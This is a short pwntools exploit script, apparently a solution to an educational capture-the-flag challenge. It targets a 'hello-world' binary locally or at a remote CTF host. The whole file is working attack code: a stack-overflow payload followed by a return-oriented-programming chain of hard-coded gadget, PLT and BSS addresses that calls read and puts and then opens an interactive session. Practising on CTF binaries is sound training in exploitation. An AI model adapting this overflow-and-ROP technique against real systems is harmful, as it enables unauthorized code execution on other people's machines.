#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('edu-ctf.zoolab.org', 30212)
else:
    r = process('./hello-world')

plt_puts = 0x401080
plt_read = 0x401090
bss = 0x404140

rop_pop_rdi_ret = 0x4013a3
rop_pop_rsi_r15_ret = 0x4013a1
main = 0x401301

rop = flat(
    rop_pop_rdi_ret, 3,
    rop_pop_rsi_r15_ret, bss, 0,
    plt_read,
    rop_pop_rdi_ret, bss,
    plt_puts,
    main
)

r.send(b'\xff' + b'\x00' * 0x8 * 15 + rop)
r.interactive()
